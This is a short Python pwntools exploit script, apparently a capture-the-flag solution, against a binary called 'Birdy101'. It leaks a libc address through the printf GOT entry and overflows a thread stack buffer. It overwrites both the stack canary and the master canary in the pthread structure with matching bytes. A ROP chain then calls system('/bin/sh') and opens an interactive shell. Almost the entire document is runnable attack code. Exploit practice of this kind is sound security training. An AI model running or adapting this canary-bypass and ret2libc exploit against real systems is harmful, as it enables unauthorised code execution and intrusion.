#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./Birdy101_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "b *register_user+266")

# Leak the libc address:
io.sendlineafter(b"name? ", p64(elf.got.printf))
io.recvuntil(b"Welcome ")
libc_leak = fixleak(io.recvuntil(b"\n"))
libc.address = libc_leak - libc.sym.printf
print("libc @ %#x" % libc.address)

POP_RDI = libc.address + 0x000000000002a3e5
RET = libc.address + 0x0000000000029139

payload = flat(
	# buffer till canary on the thread stack
	cyclic(264),
	# Canary value
	b"AAAAAAAA",
	# Padding till RIP
	cyclic(0x8), 
	# ROP chain:
	POP_RDI,
	next(libc.search(b"/bin/sh")),
	RET,
	libc.sym.system
)

payload += flat(
	# Overflowing till pthread->header.self
	cyclic(0x910 - len(payload)), 
	# avoiding SIGSEGV by pointing self->canceltype to a valid address.
	# [rax+0x972] __pthread_disable_asynccancel
	elf.bss(0) - 0x972,
	# Padding
	cyclic(0x10),
	# Actual master canary value:
	b"AAAAAAAA"
)

io.sendlineafter(b"store: ", payload)

io.interactive()
